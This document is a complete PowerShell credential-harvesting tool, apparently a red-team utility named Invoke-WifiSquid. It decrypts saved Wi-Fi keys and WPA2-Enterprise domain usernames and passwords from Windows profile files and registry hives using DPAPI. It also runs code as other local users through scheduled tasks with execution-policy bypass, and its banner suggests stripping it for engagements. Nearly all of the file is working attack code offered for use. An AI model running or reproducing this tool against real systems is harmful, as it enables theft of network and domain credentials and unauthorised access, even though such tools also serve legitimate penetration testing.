# ADD THE APPROPRIATE ASSEMBLIES
Add-type -AssemblyName System.Security;
Add-type -AssemblyName System.Text.Encoding;

# ENUM
enum WifiNetworkCredType {
    Unknown
    Password
    Domain
}

class DomainCreds {
    [string] $Domain 
    [string] $Username 
    [string] $LocalUserName
    [string] $Password
    [bool] $Complete = $false 
}

# CLASS FOR NETWORK
class WifiNetwork {
    [string] $GUID
    [string] $SSID 
    [string] $DecryptedKey
    [WifiNetworkCredType] $CredType
    [string] $KeyMaterial
    [string] $IsProtected
}

# EXECUTE A FUNCTION AS ANOTHER USER, REQUIRES SYSTEM PRIVILEGES
function Invoke-RunPowershellAsUser {
    [OutputType([string])]
    param(
        [string] $domain = $env:COMPUTERNAME,
        [string] $user,
        [string] $command 
    )

    # GENERATE RANDOM ALPHANUMERIC FILE NAME AND WRITE OUT THE COMMAND TO THE FILE
    [string] $randomStr =  -join((65..90) +(97..122) | Get-Random -Count 10 | %{[char]$_})
    $pathToTaskFile = "C:\users\public\$($randomStr).ps1"

    Set-Content -Path $pathToTaskFile -value $command

    # CREATE A SCHEDULED TASK ACTION
    #$action = New-ScheduledtaskAction -Execute "powershell.exe -ExecutionPolicy Bypass -File `"$($pathToTaskFile)`""
    $action = New-ScheduledtaskAction -Execute "powershell.exe" -Argument "-ep bypass -noexit $($pathToTaskFile)"

    # FORMAT FOR TIME: 'MM/DD/YYYY HH:MM:SS PM'
    # BUILD IT TO EXECUTE 10 SECONDS IN THE FUTURE
    $timePrefix = Get-Date -Format "MM/dd/yyyy"
    $hours = [int] (Get-Date -Format "HH")
    $minutes = [int] (Get-Date -Format "mm")
    $seconds = [int] (Get-Date -Format "ss")
    $timeSuffix = Get-Date -Format "tt" # AM/PM

    # INCREMENT TEN SECONDS
    $seconds = $seconds + 10

    # ROLL OVER SECONDS INTO MINUTES IF NECESSARY
    if ($seconds -gt 59) {
        $seconds = $seconds % 60
        $minutes = $minutes + 1

        # ROLL OVER MINUTES INTO HOURS IF NECESSARY
        if ($minutes -gt 59) {
            $minutes = $minutes % 60
            $hours = $hours + 1

            # ROLL OVER HOURS IF NECESSARY
            if ($hours -gt 12) {
                $hours = 1

                # ROLL OVER INTO PM IF NECESSARY, OTHERWISE JUST WAIT
                if ($timeSuffix == "AM") {
                    $timeSuffix = "PM"
                } else {
                    Write-Host "Error building time string, wait a few seconds and try again"
                }
            }
        }
    }

    # FILL IN ZEROES AS NECESSARY
    if ($seconds -lt 10) {$seconds = "0$($seconds)"}
    if ($minutes -lt 10) {$minutes = "0$($minutes)"}
    if ($hours -lt 10) {$hours = "0$($hours)"}

    $timeTrigger = "$($timePrefix) $($hours):$($minutes):$($seconds) $($timeSuffix)"
    $trigger = New-ScheduledTaskTrigger -Once -At $timeTrigger;
    $taskName = "Launch-$($randomStr)"
    $taskUser = "$($domain)\$($user)"
    Write-Host "`tScheduling task for $($timeTrigger) as $($taskUser)"
    Write-Host "`tTask name: $taskName"

    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -User $user
    $task = Get-ScheduledTask -TaskName $taskName
}
# SLICE AN ARRAY
function Get-ByteArraySlice {

    [OutputType([byte[]])]
    param (
        [byte[]] $data,
        [int] $startIndex = -1,
        [int] $endIndex = -1
    )

    if ($startIndex -lt 0) {
        Write-Host "Error: Slice start index cannot be < 0"
        $startIndex = 0;
    }
    if ($endIndex -lt 0 -or $endIndex -gt $data.Count) {
        Write-Host "Error: Slice end index may not be < 0 or > size"
        $endIndex = $data.Count;
    }
    if ($endIndex -lt $startIndex) {
        Write-Host "Error: Slice end index may not be < start index"
        return @()
    }

    [int] $sliceSize = $endIndex - $startIndex;
    [byte[]] $slice = @(0x00) * $sliceSize;

    # COPY DATA
    for ($i = 0; $i -lt $sliceSize; $i++) {
        [int] $currentIndex = $startIndex + $i;
        $slice[$i] = $data[$currentIndex];
    }

    return $slice
}

# FIND THE INDEX OF A BYTE ARRAY INSIDE ANOTHER BYTE ARRAY
function Find-ByteArraySubstring {

    [OutputType([int])]
    param (
        [byte[]] $hayStack,
        [byte[]] $needle, 
        [int] $startAt = 0,
        [bool] $invert = $false
    )

    for ($i = $startAt; $i -lt $hayStack.length; $i++) {

        # LOOK FOR A MATCH
        [bool] $broken = $false;
        for ($j = 0; $j -lt $needle.length; $j++) {
            if ($invert) {
                if ($needle[$j] -eq $hayStack[$i + $j]) {
                    $broken = $true 
                    break;
                } 
            } else {
                if ($needle[$j] -ne $hayStack[$i + $j]) {
                    $broken = $true;
                    break;
                }
            }
        }

        if (!$broken) {
            return $i
        }
    }

    return -1
}

# USE THE DPAPI TO PULL THE DOMAIN USERNAME
function Unprotect-DomainUsername {


    [OutputType([DomainCreds])]
    param (
        [byte[]] $unprotectedBytes,
        [string] $LocalUserName
    )
    
    Write-Host "Attempting to decrypt domain credentials!"
    [DomainCreds] $domainCreds = [DomainCreds]::new()
    $domainCreds.LocalUserName = $LocalUserName


    # CONSTANTS THAT WE USE TO SEARCH THROUGH THE BLOB FOR THE USERNAME
    # https://github.com/ash47/EnterpriseWifiPasswordRecover/blob/master/EnterpriseWifiPasswordRecover/Program.cs
    [byte[]] $searchForUsername = @(0x04, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00);
    [byte[]] $searchForUsername2 = @(0x03, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00);
    [byte[]] $nullArray = @(0x00);
    
    # SEARCH FOR USERNAME FIELD START
    [int] $usernameFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $searchForUsername
    
    # IF THE USERNAME FIELD START IS FOUND, THEN LOOK FOR ITS END
    if ($usernameFieldStart -ne -1) {
        Write-Host "`tFound beginning of username field!: $($usernameFieldStart), $($unprotectedBytes[$usernameFieldStart])"

        $usernameFieldStart += $searchForUsername.Length;
        [int] $usernameFieldEnd = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt $usernameFieldStart
        
        # IF THE END OF THE FIELD IS FOUND, GRAB IT
        if ($usernameFieldEnd -ne -1) {
            Write-Host "`tFound end of username field!: $($usernameFieldEnd)"

            [byte[]] $usernameField = Get-ByteArraySlice -data $unprotectedBytes -startIndex $usernameFieldStart -endIndex $usernameFieldEnd
            Write-Host "`tUsername field is $($usernameField.Length) bytes long"
            $domainCreds.Username = [System.Text.Encoding]::UTF8.GetString($usernameField);
            Write-Host "`tUsername: $($domainCreds.username). Looking for domain creds"
            # THEN, FIND THE DOMAIN START
            [int] $domainFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true;

            # CHECK FOR A DOMAIN. IF WE REACHED 0xE6 THEN NO DOMAIN WAS FOUND
            if ($domainFieldStart -ne -1 -and $unprotectedBytes[$domainFieldStart] -ne 0xE6) {

                Write-Host "`tFound beginning of domain field!"
                [int] $domainFieldEnd = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt $domainFieldStart

                if ($domainFieldEnd -ne -1) {
                    Write-Host "`tFound the end of the domain field!"
                    [byte[]] $possibleDomainField = Get-ByteArraySlice -data $unprotectedBytes -startIndex $domainFieldStart -endIndex $domainFieldEnd
                    $domainCreds.Domain = [System.Text.Encoding]::UTF8.GetString($possibleDomainField);
                } else {
                    Write-Host "`tFailed to find end of the domain field!"
                }
            } else {
                Write-Host "`tFailed to find beginning of domain field, network doesn`'t require it."
            }
        } else {
            Write-Host "Failed to find end of username field!"
        }
    } else {
        
        Write-Host "`tFailed to find beginning of username field! Trying with different bytes"
        # IF IT'S NOT FOUND, MAYBE IT'S NOT ENCRYPTED
        $usernameFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $searchForUsername2
        Write-Host $usernameFieldStart

        if ($usernameFieldStart -ne -1) {

            # MAYBE WE DO ACTUALLY HAVE A DOMAIN?
            # SKIP NULL BYTES
            $usernameFieldStart += $searchForUsername2.Length;
            $usernameFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt $usernameFieldStart -invert $true 

            # FIND WHERE THE DOMAIN FIELD ENDS
            [int] $usernameFieldEnd = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true
            [byte[]] $usernameField = Get-ByteArraySlice -data $unprotectedBytes -startIndex $usernameFieldStart -endIndex $usernameFieldEnd
            $domainCreds.Username = [System.Text.Encoding]::UTF8.GetString($usernameField)

            # LOOK FOR THE PASSWORD FIELD
            [int] $passwordFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true
            if ($passwordFieldStart -ne -1) {

                [int] $passwordFieldEnd = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt ($passwordFieldStart + 1)
                if ($passwordFieldEnd -ne -1) {
                    [byte[]] $passwordField = Get-ByteArraySlice -data $unprotectedBytes -startIndex $passwordFieldStart -endIndex $passwordFieldEnd
                    $domainCreds.Password = [System.Text.Encoding]::UTF8.GetString($passwordField)
                    
                    # LOOK FOR THE DOMAIN FIELD
                    [int] $domainFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt ($passwordFieldEnd + 1) -invert $true
                    if ($domainFieldStart -ne -1) {
                        [int] $domainFieldEnd = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $nullArray -startAt ($domainFieldStart + 1)
                        if ($domainFieldEnd -ne -1) {
                            [byte[]] $domainField = Get-ByteArraySlice -data $unprotectedBytes -startIndex $passwordFieldStart -endIndex $passwordFieldEnd
                            if ($domainField[0] -ne 0x01) {
                                $domainCreds.Password = [System.Text.Encoding]::UTF8.GetString($domainField);
                                $domainCreds.Complete = $true
                            }
                        }
                    }
                }
            } 
        }
        else {
            Write-Host "Failed to find username field!"
        }
    }

    return $domainCreds


}

# USE THE DPAPI TO PULL THE DOMAIN PASSWORD
function Unprotect-DomainPassword
 {
    [OutputType([DomainCreds])]
    param (
        [byte[]] $unprotectedBytes,
        [DomainCreds] $domainCreds
    )

    [byte[]] $searchForPassword = @( 0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xDF, 0x01)

    # CHECK FOR THE ENCRYPTED DATA CHUNK
    [int] $passwordFieldStart = Find-ByteArraySubstring -hayStack $unprotectedBytes -needle $searchForPassword
    if ($passwordFieldStart -ne -1) {
        Write-Host "`tFound password blob with start index $($passwordFieldStart)"
        [byte[]] $protectedPasswordBytes = Get-ByteArraySlice -data $unprotectedBytes -startIndex $passwordFieldStart -endIndex $unprotectedBytes.Length

        try {
            # TRY TO UNPROTECT THE PASSWORD - NEEDS TO BE RUN AS THE USER IN QUESTION
            Write-Host "`tTrying to unprotect password"
            [byte[]] $unprotectedPassword = [System.Security.Cryptography.ProtectedData]::Unprotect($protectedPasswordBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine);
        

            # STRIP NULL BYTES
            for ($i = 0; $i -lt $unprotectedPassword.Length; $i++) {
                if ($unprotectedPassword[$i] -eq 0x00) {
                    Write-Host "Trimming null bytes from decrypted password"
                    $unprotectedPassword = Get-ByteArraySlice -data $unprotectedPassword -startIndex 0 -endIndex $i 
                    break;

                }
            }

            $domainCreds.Password = [System.Text.Encoding]::UTF8.getString($unprotectedPassword)
            $domainCreds.Complete = $true 
            return $domainCreds
        }
        catch {
            Write-Host "`tAn error occurred - Most likely you need to run this as the user who owns the password"
            Write-Host "`tAttempting to impersonate the user via scheduled task..."

            # TODO: WRITE BYTES TO FILE
            [string] $randomStr =  -join((65..90) +(97..122) | Get-Random -Count 10 | %{[char]$_})
            $binFilePath = "C:\Users\Public\$($randomStr).bin"
            $pwFilePath = "C:\Users\Public\$($randomStr).pw"
            [System.IO.File]::WriteAllBytes($binFilePath, $protectedPasswordBytes);

            # TODO: INVOKE COMMAND AS USER TO READ THE FILE, DECRYPT, WRITE TO FILE
            <# COMMAND WOULD BE THIS: 
            [bytes[]] $protectedPasswordBytes = [System.IO.File]::ReadAllBytes($binFilepath)
            [bytes[]] $unprotectedPasswordBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($protectedPasswordBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine);
            [string] $password = [System.Text.Encoding]::UTF8.GetString($unprotectedPasswordBytes);
            [System.IO.File]::WriteAllText($pwFilePath, $password);
            #>

            # READ BYTES FROM FILE, DECRYPT, CONVERT TO STRING, AND WRITE OUT
            $command = 'Add-type -AssemblyName System.Security;Add-type -AssemblyName System.Text.Encoding;';
            $command = $command + '$protectedPasswordBytes = [System.IO.File]::ReadAllBytes("' + $binFilePath + '");';
            $command = $command + '$unprotectedPasswordBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($protectedPasswordBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine);';
            $command = $command + '$password = [System.Text.Encoding]::UTF8.GetString($unprotectedPasswordBytes);';
            $command = $command + '[System.IO.File]::WriteAllText("' + $pwFilePath + '", $password);';
            
            # RUN THE COMMAND AS THE USER
            Write-Host "Attempting to decrypt credentials as user $($domainCreds.LocalUserName)"
            Invoke-RunPowershellAsUser -user $domainCreds.LocalUserName -command $command;

            # SLEEP 15 SECONDS SINCE THE COMMAND IS ON A 10 SECOND DELAY
            Start-Sleep 15;

            # TODO: READ PASSWORD FROM A FILE
            $passwordStr = [string] [System.IO.File]::ReadAllText($pwFilePath);
            Write-Host "Got password: $($passwordStr)"
            if ($passwordStr) {
                $domainCreds.Password = $passwordStr;
                $domainCreds.Complete = $true;
            } else {
                Write-Host "Failed to get password :(";
            }

            # CLEANUP
            Remove-Item -Path $binFilePath
            Remove-Item -Path $pwFilePath

        }
    } else {
        Write-Host "`tCould not find the start of the password field!"
    }
    return $domainCreds
}


# STORE NETWORKS
[WifiNetwork[]] $foundNetworks = @();
[WifiNetwork[]] $notFoundNetworks = @();

Write-Host @"

                        ___
                    .-'   ``'.
                    /         \
                    |         ;
                    |         |           ___.--,
           _.._     |0) ~ (0) |    _.---'``__.-( (_.
    __.--'``_.. '.__.\    '--. \_.-' ,.--'``     ``""``
   ( ,.--'``   ',__ /./;   ;, '.__.'``    __
  _``) )  .---.__.' / |   |\   \__..--""  """--.,_
``---' .'.''-._.-'``_./  /\ '.  \ _.-~~~````````~~~-._``-.__.'
       | |  .' _.-' |  |  \  \  '.               ``~---``
       \ \/ .'      \  \   '. '-._)
        \/ /         \  \    ``=.__``~-.
        / /\         ``) )    / / ``"".``\
   , _.-'.'\ \       / /    ( (     / /
  ``--~``   ) )     .-'.'      '.'.  | (
           (/``    ( (``          ) )  '-;
            ``      '-;         (-'

"@;
# PLEASE STRIP THIS BANNER IF YOU WANT TO USE THIS ON AN ENGAGEMENT :)
Write-Host "Invoke-WifiSquid by @0xblacklight`n";
Write-Host "This tool was developed for research and demonstration purposes only!"
Write-Host "Please use it in a legal and responsible manner only. "

# GRAB THE WIFI CONFIG XML FILES AND LOOP OVER THEM. SUPPY DIRECTORY NAME IN VARIABLE
# TODO: ALLOW COMMAND LINE ARG TO SPECIFY 
$dirName = "C:\programdata\Microsoft\Wlansvc\Profiles\Interfaces" # INTERFACES LIST

# FIND INTERFACE DIRECTORIES
$ifaceFolders = Get-ChildItem $dirName;
for ($i = 0; $i -lt $ifaceFolders.Count; $i++) {

    $fullPathToConfigs = "$($dirName)\$($ifaceFolders[$i])";
    Write-Host "Found full path to interface folder: $($fullPathToConfigs)`n";

    # FIND XML FILES
    Write-Host "Found XML File for WPA-PSK networks!:";
    $networkConfigs = Get-ChildItem $fullPathToConfigs;

    # LOOP THROUGH NETWORK CONFIGS IN WINDOWS DIR
    for ($j = 0; $j -lt $networkConfigs.Count; $j++) {

        $fullPathToConfig = "$($fullPathToConfigs)\$($networkConfigs[$j])"
        Write-Host "`t$($networkConfigs[$j])";

        $network = [WifiNetwork]::new();

        # PARSE XML AND GET THE CONFIG
        [xml]$wifiConfig = Get-Content $fullPathToConfig;
        $pattern = '(?<=\{).+?(?=\})'
        $network.GUID = [regex]::Matches($networkConfigs[$j], $pattern).Value
        $network.SSID = $wifiConfig.WLANProfile.name;
        
        if ($wifiConfig.WLANProfile.MSM.security.sharedKey.keyType) {
            $network.CredType = [WifiNetworkCredType]::Password
        } else {
            $network.CredType = [WifiNetworkCredType]::Unknown
        }
        $network.IsProtected = $wifiConfig.WLANProfile.MSM.security.sharedKey.protected;
        $network.KeyMaterial = $wifiConfig.WLANProfile.MSM.security.sharedKey.keyMaterial;

        # IF THERE'S KEY MATERIAL, THEN DECRYPT IT AND ADD IT TO FOUND ONES. OTHERWISE, ADD IT TO THE LIST OF NOT FOUND ONES THAT WE'LL COME BACK TO 
        if ($network.KeyMaterial) {
            $keyBytes = [byte[]] ($network.KeyMaterial -replace '^0x' -split '(..)' -ne '' -replace '^', '0x');
            try {
                $decryptedNetworkKeyBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine);
                $network.DecryptedKey = [System.Text.Encoding]::UTF8.GetString($decryptedNetworkKeyBytes);
            }
            catch [System.Security.Cryptography.CryptographicException] {
                #Write-Host "`t`tAn error occurred for network $($network.SSID) ($($network.GUID)): $($_)";
            }
            
            $foundNetworks += $network;
        }
        else {
            $notFoundNetworks += $network
        }
    }

}

# MOUNT HKEY_USERS
New-PSDrive -Name HKU Registry HKEY_USERS;

# NOW, FOR ANY NETWORKS WE COULDN'T FIND KEYS FOR, LET'S GO THROUGH THE REGISTRY AND LOOK FOR THEM
# BUILD A LIST OF LOCAL USERS
$users = Get-LocalUser;

$hives = @( "HKCU", "HKLM");
$userNames = @("", "");

# MOUNT USERS REGISTRIES AS user:\
foreach ($u in $users) {
    $user = New-Object System.Security.Principal.NTAccount($u.Name);
    $userNames += $u.Name;

    # TODO: THIS IS PROBABLY UNECESSARY
    $sid = $user.Translate([System.Security.Principal.SecurityIdentifier]).value;
    Write-Host "Found user $($u.Name) - $($sid)";

    # CAN GRAB THE USER'S HIVE THEN BY DOING Get-Item "HKU:\${sid}"
        
    $hives += "HKU:\$($sid)"
        
}

# CREATE LIST OF HIVES
[string[]] $regKeys = @("\Software\Microsoft\Wlansvc\UserData\Profiles", "\Software\Microsoft\Wlansvc\Profiles");

# THIS WILL BE THE CASE FOR WPA2-ENTERPRISE (DEFINITELY) AND PEAP (POSSIBLY)
for ($a = 0; $a -lt $notFoundNetworks.Count; $a++) {

    [WifiNetwork] $network = $notFoundNetworks[$a];
        
    # LOOP THROUGH HIVES, AND CHECK EACH OF THE regKeys
    $userNameIndex = 0;
    foreach ($hive in $hives) {

        
        foreach ($key in $regKeys) {
                
            $path = "$($hive)$($key)\{$($network.GUID)}"

            # IF THE PATH EXISTS, GRAB THE KEY AND DECRYPT
            if (Test-Path $path) {
                
                # UPDATE THE NETWORK KEY TYPE TO DOMAIN SINCE WE FOUND DOMAIN CREDS
                $network.CredType = [WifiNetworkCredType]::Domain

                Write-Host "Found key at $($path)"

                # GET DPAPI PROTECTED BLOB
                [byte[]] $protectedKey = (Get-ItemProperty $path).MSMUserData;
                [byte[]] $unprotectedKey = @();
                try {

                    # TRY TO UNPROTECT
                    $unprotectedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($protectedKey, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine);
                    
                    # THEN, DECRYPT/DECIPHER IT FROM THE WEIRD FORMAT
                    # GET THE USERNAME OF THE CURRENT LOCAL USER
                    $currentUserName = $userNames[$userNameIndex];
                    Write-Host "Got username: $($userNames[$userNameIndex])"

                    # UNPROTECT THE USERNAME AND PASSWORD
                    [DomainCreds] $domainCreds = Unprotect-DomainUsername -unprotectedBytes $unprotectedKey -LocalUserName $currentUserName
                    $domainCreds = Unprotect-DomainPassword -unprotectedBytes $unprotectedKey -domainCreds $domainCreds
                    
                    # CHECK THE RESULT OF THE DECRYPTED CREDS
                    if ($domainCreds.Domain) {
                        $network.DecryptedKey = "$($domainCreds.Domain)\$($domainCreds.Username):$($domainCreds.Password)"
                    } else {
                        $network.DecryptedKey = "$($domainCreds.Username):$($domainCreds.Password)"
                    }

                    $foundNetworks += $network

                } catch {
                    Write-Host "`tFailed to Decrypt key! $($_)"
                }

                Write-Host "Finished decrypting key!"
                break;

                
            }
        }
        $userNameIndex = $userNameIndex + 1
    }
        

        

}

# PRINT THE NETWORKS WE FOUND
for ($a = 0; $a -lt $foundNetworks.Count; $a++) {
    [WifiNetwork] $network = $foundNetworks[$a]
    Write-Host "Got key for network: $($network.SSID): $($network.DecryptedKey)";
}
Write-Host "";

# PRINT THE NETWORKS WE DIDN'T FIND
for ($a = 0; $a -lt $notFoundNetworks.Count; $a++) {
    [WifiNetwork] $network = $notFoundNetworks[$a]
    Write-Host "Failed to get key for network $($network.SSID) :(";
}


